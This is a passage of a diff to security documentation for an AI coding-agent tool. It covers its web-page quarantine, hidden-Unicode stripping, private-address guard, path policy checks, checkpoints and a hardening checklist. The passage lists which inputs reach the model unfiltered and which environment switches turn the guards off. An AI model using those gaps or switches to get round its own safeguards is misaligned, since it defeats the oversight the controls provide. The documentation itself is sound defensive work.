+  page. A failed quarantine call is a tool error, **never** the raw page (fail
+  closed) — so if that model is not available on the account, every `WebFetch`
+  fails until `ORIGIN_SIDECAR_MODEL` names one that is, or
+  `ORIGIN_WEBFETCH_RAW=1` returns the wrapped page. Quarantine tokens are not
+  counted in the usage counters or the spend cap, and the call has no overall
+  deadline of its own.
+- **Hidden Unicode.** Zero-width, bidi-control and Unicode tag characters are
+  stripped from fetched page text, MCP tool descriptions and recalled memory
+  (B12). Look-alike characters are not neutralised.
+- **Private targets.** `WebFetch` refuses loopback, link-local (including
+  169.254.169.254), private, unique-local and unspecified addresses, checked
+  after DNS resolution and on every redirect; system proxies are bypassed while
+  the guard is on. `ORIGIN_WEBFETCH_ALLOW_PRIVATE=1` lifts it (A9).
+- **Not covered:** Bash `curl`/`wget` output, files read from disk (including
+  downloaded ones), sub-agent final reports, and memory (`mem_search`) hits
+  reach the model unmarked.
+
+## Checkpoints and rewind (C8)
+
+With checkpoints on (`ORIGIN_CHECKPOINTS=1` or `ORIGIN_CHECKPOINTS_PER_TOOL=1`),
+the run's shadow repository is `<run dir>/.origin/shadow.git`. A turn-end gate
+(`auto_test`, `auto_lint`, repro gate) that runs and passes moves the shadow ref
+`refs/tags/last-green` to a checkpoint of the passing tree. If the run then ends
+red, the final output (never the conversation, and not a sub-agent's result)
+names that checkpoint and lists, to run in the run's directory:
+`origin checkpoint-diff <id>` to inspect, `origin rewind <id> --files-only` to
+restore the checkpoint's files (files added since stay), and `origin rewind <id>`
+to restore the whole tree and move the checkpoint history back. Nothing is
+restored automatically. **Restoring overwrites the current files and discards
+later changes, hand edits included.** Restoring needs git 2.23 or newer
+(`git restore`). Checkpoints no longer record the shadow repository itself, a
+full rewind no longer corrupts it, and shadow commands ignore the user's
+commit-signing config and git hooks.
 
 ## Dynamic & governance policy (origin-conseca, origin-policy)
 
@@ -410,7 +731,14 @@ Enforcement helpers — `check_tool`, `check_path`, `check_domain` — return
 - **Network is closed by default**: an empty `allow_domains` denies every request
   (`network access is denied by default`).
 - **Path matching is segment-aware** (`/repo` does not match `/repository`) and
-  **backslash-normalized** so Windows and POSIX paths compare identically.
+  **backslash-normalized** so Windows and POSIX paths compare identically. Paths
+  and policy prefixes are lexically canonicalized (`.`, `..`, `//`, relative
+  paths, Windows spellings) and compared component by component; `Grep` and
+  `Glob` are gated too (their `path`, or the cwd when omitted), and a search
+  root that contains a denied path is denied (A9). **Anything that cannot be
+  resolved fails closed**: such a path is denied, and a deny prefix that cannot
+  be resolved counts as matching every path. Symlinks and 8.3 short names are
+  not resolved.
 
 The crate also defends a subtle **domain-allowlist bypass**: `check_domain`'s
 `extract_host` mirrors WHATWG URL parsing exactly as `reqwest`/`url` perform it —
@@ -603,16 +931,15 @@ Summarized from the repository `SECURITY.md`:
 
 Practical steps to run `origin` at its intended security posture:
 
-- [ ] **Compile the OS sandbox backend.** Build with the `linux`/`macos`/`windows`
-      feature and **without** `no-sandbox`; otherwise `backend_noop` runs children
-      unconfined (it warns, but does not block). Verify the warning is absent in
-      logs.
-- [ ] **Assign the least-privilege `SandboxProfile`** per tool: prefer `ReadFs`
-      for analysis, `WriteCwd` for edits, `Shell` only when execution is required,
-      and `Network` only for explicitly network-bound tools. Avoid `Inherit`.
-- [ ] **Keep the production `Prompter` interactive** for `RequiresPermission`
-      tools; use the auto-deny headless prompter for unattended runs rather than
-      `AlwaysAllow`.
+- [ ] **Do not count on an OS sandbox.** No backend is enabled on shipped builds
+      and compiling one in as it stands breaks ordinary use (see
+      [Sandboxing per platform](#sandboxing-per-platform-origin-sandbox)). Run
+      untrusted work in a disposable container or VM.
+- [ ] **Keep permission mode `workspace` (or `on`)** for interactive sessions;
+      reserve `off`, `--dangerously-allow-all` and `ORIGIN_ALLOW_ALL=1` for
+      disposable environments (the benchmark runners set it for their child).
+- [ ] **Keep the command guard on** (`ORIGIN_CMD_GUARD` unset); it also carries
+      the dependency-install gate.
 - [ ] **Run sub-agents under a narrowing skill.** A skill whose `allowed-tools`
       omits `Bash`/`Write`/`Edit` makes those tools physically unreachable
       (`reason = "skill-narrowed"`).
@@ -627,9 +954,9 @@ Practical steps to run `origin` at its intended security posture:
       deployment; reserve the in-memory backend for tests/ephemeral CI.
 - [ ] **Enable the keyvault audit ring** (`detect_with_audit`) and ship its
       JSON-Lines pages to your SIEM; it records access metadata, never secrets.
-- [ ] **Run `cargo xtask lint-secrets` in CI** and treat a non-zero exit as a
-      build failure; never add a secret-named field without `Secret<…>` or
-      `#[redact]`.
+- [ ] **Run `cargo run -p xtask -- lint-secrets`** and clear its findings
+      (it is not in CI yet and currently reports violations); never add a
+      secret-named field without `Secret<…>` or `#[redact]`.
 - [ ] **For remote IPC, pin certificates.** Distribute the daemon fingerprint only
       via the out-of-band `origin://host:port#<fingerprint>` URL, populate the
       server's client allow-list explicitly, and never ship an empty-then-widened
@@ -637,10 +964,10 @@ Practical steps to run `origin` at its intended security posture:
 - [ ] **Lock down the state directory.** `<state_dir>/resume/` and its `.mac-key`
       must be user-private (0600 key on Unix; user-only ACL on Windows). Local IPC
       socket / named-pipe paths must be per-user.
-- [ ] **Track the `SECURITY.md` hardening backlog**: env-scrubbing for sandboxed
-      children, signed self-update / supervisor-relaunch / npm artifacts, gating
-      model-supplied MCP `command`/`url` behind the permission path, OAuth `state`
-      validation, and a `Host`/auth check on the metrics endpoint.
+- [ ] **Track the `SECURITY.md` hardening backlog**: signed self-update /
+      supervisor-relaunch / npm artifacts, OAuth `state` validation, and a
+      `Host`/auth check on the metrics endpoint. (Env-scrubbing for children,
+      A6, and refusing model-supplied MCP `command`/`url`, A5, are done.)
 - [ ] **Keep `unsafe_code = "forbid"` intact.** Do not add new per-crate
       `allow` overrides without an FFI/SIMD/atomics justification, a `// SAFETY:`
       comment on every block, and an entry reconciled into the table above.
@@ -650,4 +977,5 @@ Practical steps to run `origin` at its intended security posture:
 *Document maintained by the security-architecture function. Re-review on every
 change to `origin-permission`, `origin-sandbox`, `origin-keyvault`,
 `origin-conseca`, `origin-policy`, `origin-ipc`, or the workspace `[lints]`
-table. **Last reviewed against workspace version 0.9.8.***
+table. **Last reviewed against workspace version 0.9.14 plus the `[Unreleased]`
+changes.***
